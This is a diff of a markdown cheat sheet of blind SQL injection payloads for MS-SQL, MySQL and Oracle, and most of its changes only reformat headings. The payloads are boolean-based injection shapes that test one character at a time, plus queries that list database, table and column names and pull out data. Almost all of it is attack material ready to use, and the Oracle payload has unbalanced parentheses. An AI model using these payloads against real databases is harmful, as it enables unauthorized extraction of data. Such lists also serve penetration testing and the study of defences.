@@ -1,59 +1,58 @@
-<h2>[MS-SQL]</h2>  
-# Shape  
+# [MS-SQL]  
+## Shape  
 ``` sql
-??' and substring((query), 1, 1) < 'a'--  
+OO' and substring((query), 1, 1) < 'a'--  
 ```  
 
-# get DB NAME  
+## get DB NAME  
+``` sql
 db_name()  
+```
   
-# Get Table name  
+## Get Table name  
 ``` sql
 select top 1 name from sysobjects where xtype='U'  
 ```
 
-# Get Column name  
+## Get Column name  
 ``` sql
 select top 1 column_name from information_schema.columns where table_name = '[Table Name]'  
 ```
   
-# Get Data  
+## Get Data  
 ``` sql
 select top 1 [Column Name] from [Table Name]  
 ```
   
-<h2>[MySQL]</h2>  
-# Shape  
+# [MySQL]  
+## Shape  
 ``` sql
 ???' and ascii(substr((query), 1, 1)) > 'a'#  
-```
+```  
 
-
-# Get Table Name
+## Get Table Name
 ``` sql
 select table_name from information_schema.tables where table_type='base table' limit 0,1  
                                                                                      ㄴ> 0번 째 테이블  
 ```
   
-  
-  
-<h2>[Oracle]</h2>   
-#Shape   
+# [Oracle]   
+## Shape   
 ``` sql
 and (ascii(SUBSTR(query),1,1))) > 1--  
 ```
   
-#Get DB name   
+## Get DB name   
 ``` sql
 select DISTINCT owner FROM all_tables;  
 ```
   
-#Get Table name   
+## Get Table name   
 ``` sql
 select table_name from all_tables;  
 ```
   
-#Get Column name   
+## Get Column name   
 ``` sql
 select column_name from all_tab_columns where table_name='[table name]';
 ```
